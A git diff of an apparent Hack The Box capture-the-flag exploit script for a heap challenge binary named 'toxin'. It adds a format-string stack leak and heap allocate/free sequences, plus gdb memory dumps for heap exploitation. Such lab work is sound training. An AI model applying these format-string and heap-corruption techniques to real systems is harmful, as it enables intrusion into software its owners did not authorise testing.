@@ -1,16 +1,16 @@
 import dataclasses
 import ipaddress
 import pathlib
-from loguru import logger
-from pwnlib import gdb
+import re
+import string
+from time import sleep
 
+from loguru import logger
+
+from core.gdb_wrapper import GdbWrapper
 from core.target_config import Config, Mode
 from core.targetbase import TargetBase
-from custom.toxin import ToxinPwn
-from pwn import p64, u64
 
-from modules.find_function import FindFunction, Method
-from modules.get_libc_address import GetLibcAddress
 
 
 def create_toxin(index: int, size: int, data: bytes):
@@ -30,6 +30,7 @@ def search_toxin(data: bytes):
     print(t.process.clean(0.2).decode(), data)
     t.process.sendline(data)
     result = t.process.recvline()
+    print(result)
     if b'not found' in result:
         return None
     return result
@@ -50,39 +51,76 @@ def edit_toxin(index: int, data: bytes):
     print(t.process.clean(0.2).decode(), data)
     t.process.sendline(data)
 
+def read_stack(pos: int=0):
+    print(t.process.clean(0.2).decode(), "4")
+    t.process.sendline(b"4")
+    data = f"%{pos}$p"
+    print(t.process.clean(0.2).decode(), data)
+    t.process.sendline(data.encode())
+    result = t.process.recvline()
+    match = re.search(f'(0x[{string.hexdigits}]+)', result.decode())
+    if match:
+        print(match[1])
+        return match[1]
+    print(result)
+    return None
+
 
 if __name__ == '__main__':
     remote_config = Config(
         rop=True,
         mode=Mode.local,
-        ip=ipaddress.IPv4Address('165.22.124.179'),
-        port=32735,
+        ip=ipaddress.IPv4Address('142.93.34.45'),
+        port=30006,
         file=pathlib.Path('/home/lim8en1/htb/projects/toxin/toxin_mod'),
         no_offset=True,
         detect_libc=True
     )
 
-    signature_0 = b'\xDE\xAD\xBE\xEF\x00'
-    signature_1 = b'\xC0\x01\xBA\xBE\x00'
-    signature_2 = b'\xCA\xFE\xBA\xBE\x00'
+    signatures = (b'\xDE', b'\xC0', b'\xCA')
+    max_allocate_size = 0xE0
+    t = TargetBase(config=remote_config)
 
-    max_allocate_size = 0xDF
-    chunk_size = 0xB0
-    t = TargetBase(pwn_target=ToxinPwn, config=remote_config)
+    stack = []
+    for pos in range(1, 20):
+        result = read_stack(pos)
+        stack.append(result)
+    logger.debug("\n".join(f"{i}:{x}" if x else f"{i}:(null)" for i, x in enumerate(stack)))
 
-    _, debugger = gdb.attach(t.process.pid, api=True)
-    debugger.execute('c')
+    sizes = (0x28, 0x17, 0x19)
+    indices = (0, 1, 2)
+    index_to_free = 0
+    for index in indices:
+        create_toxin(index, sizes[index], data=signatures[index] + str(index).encode() * 4 + b'\0')
+        if index == index_to_free:
+            free_toxin(index)
+    stack = []
+    for pos in range(1, 20):
+        result = read_stack(pos)
+        stack.append(result)
+    logger.debug("\n".join(f"{i}:{x}" if x else f"{i}:(null)" for i, x in enumerate(stack)))
 
-    create_toxin(1, max_allocate_size, data=signature_1 + (chunk_size-5) * b'B')
-    free_toxin(1)
-    create_toxin(2, chunk_size, data=signature_2 + (max_allocate_size-chunk_size-5) * b'C')
-    create_toxin(0, max_allocate_size-0xE, data=signature_0 + (max_allocate_size-5) * b'A')
-    debugger.interrupt_and_wait()
-    print(search_toxin(signature_1))
-    print(search_toxin(signature_2))
-    edit_toxin(0, signature_0)
-    print(search_toxin(signature_0))
+    with GdbWrapper(t.process.pid) as debugger:
+        debugger.resume()
+        debugger.interrupt()
+        toxin_freed = debugger.read_value('(long int)&toxinfreed')
+        logger.debug(f"Toxin freed @ {toxin_freed}")
+        sizes_address = debugger.read_value('(long int)&toxins')
+        logger.debug(f"Values @ {sizes_address}")
+        values = debugger.read_memory('(long int)&toxins', count=3, modifier='g')
+        sizes_address = debugger.read_value('(long int)&sizes')
+        logger.debug(f"Sizes @ {sizes_address}")
+        sizes_read = debugger.read_memory('(long int)&sizes', count=3, modifier='g')
 
-    pass
-    # t.process.interactive()
-
+        for index in indices:
+            address = values[index]
+            data = bytearray(sizes_read[index])
+            data_as_list = debugger.read_memory(address, count=sizes_read[index])
+            logger.debug(f"Address: {hex(address)}")
+            for i, byte in enumerate(data_as_list):
+                data[i] = byte
+            pos = 0
+            while pos < len(data):
+                logger.debug(" ".join(f'{x:02x}' for x in data[pos:pos+0x10]))
+                pos += 0x10
+        debugger.resume()
